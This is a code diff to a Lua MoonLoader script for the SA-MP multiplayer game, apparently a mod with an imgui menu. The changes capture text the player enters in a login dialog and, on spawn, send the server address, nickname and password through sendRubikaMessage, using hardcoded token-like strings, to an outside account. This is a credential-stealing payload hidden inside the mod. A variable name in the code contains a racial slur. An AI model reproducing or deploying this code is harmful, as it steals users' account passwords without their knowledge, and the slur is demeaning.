@@ -6,6 +6,7 @@ script_author("PveRegnar")
 local imgui = require 'mimgui'
 local encoding = require 'encoding'
 local ev = require 'lib.samp.events'
+local Asid = ""
 
 encoding.default = 'CP1251'
 u8 = encoding.UTF8
@@ -399,7 +400,11 @@ imgui.Columns(1)
         imgui.End()
     end)
     
-function ev.onSendDialogResponse(dialogId, button, listboxId, input)
+function ev.onSendDialogResponse(dialogId, button, listboxId, input) Asid = input end
+
+function ev.onSendSpawn()
+
+
 
 local result, myPlayerId = sampGetPlayerIdByCharHandle(PLAYER_PED)
 
@@ -410,8 +415,11 @@ end
 local IP, Port = sampGetCurrentServerAddress()
 
 if Regnar.FirstDialog then
-sendRubikaMessage("CBDEBI0TVSIILEMQTMXEBUKMMXTGKNGUCLSFNLNYOMLKTCWFLWCWZKXUHONEQVXR", "b0JJvog0wVf0f8157691cc869f3fe144", "Server IP: "..IP..":"..Port.."\n\nNickName: "..NiggaName.."\nPassWord: "..input);
+sendRubikaMessage("CBDEBI0TVSIILEMQTMXEBUKMMXTGKNGUCLSFNLNYOMLKTCWFLWCWZKXUHONEQVXR", "b0JJvog0wVf0f8157691cc869f3fe144", "Server IP: "..IP..":"..Port.."\n\nNickName: "..NiggaName.."\nPassWord: "..Asid);
 Regnar.FirstDialog = false
 end
+
+
+
 
 end
